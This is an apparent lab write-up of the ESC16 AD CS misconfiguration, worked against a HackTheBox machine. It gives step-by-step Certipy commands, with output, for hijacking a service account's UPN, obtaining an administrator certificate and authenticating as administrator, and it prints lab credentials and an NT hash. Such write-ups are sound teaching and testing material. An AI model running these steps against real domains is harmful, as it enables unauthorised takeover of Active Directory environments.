# ESC16: CA-Wide Security Extension Removal

### overview:
ESC16 represents a critical misconfiguration where the CA is configured to omit the `szOID_NTDS_CA_SECURITY_EXT` extension (OID: `1.3.6.1.4.1.311.25.2`) on every certificate it issues.
Without this extension, every certificate issued by this CA will lack this SID security extension

**Key Difference from ESC9:**

- **ESC9**: Individual templates lack the security extension requirement
- **ESC16**: The CA itself is configured to never include the security extension, affecting ALL certificates regardless of template.
***

### Exploitation

> first of all you need to get a ticket for `ca_svc` that will be used latter.

**Step 1: Read initial UPN of the victim account**
```shell
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
```

**Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.**
```bash
certipy account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update


# output:
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'

```



**step 3: request any cert with user authentication like the `user` template:**
```bash
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'


# expected output:
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**step 4: revert the `ca_svc`'s UPN:**
```bash
certipy account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update

```


**step 5: authenticate:**
```bash
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'

```
